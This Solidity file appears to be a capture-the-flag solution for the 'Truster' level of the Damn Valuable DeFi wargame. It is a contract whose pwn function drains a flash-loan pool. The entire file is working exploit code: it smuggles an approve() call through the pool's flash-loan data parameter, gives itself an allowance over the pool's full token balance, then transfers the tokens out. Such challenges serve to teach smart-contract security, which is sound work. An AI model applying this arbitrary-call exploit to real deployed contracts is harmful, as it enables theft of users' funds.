// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract Normal {
    function pwn(TrusterLenderPool pool, DamnValuableToken token) public {
        uint256 _balance = token.balanceOf(address(pool));

        bytes memory _payload = abi.encodeWithSignature("approve(address,uint256)", address(this), _balance);
        pool.flashLoan(0, msg.sender, address(token), _payload);
        token.transferFrom(address(pool), msg.sender, _balance);
    }
}
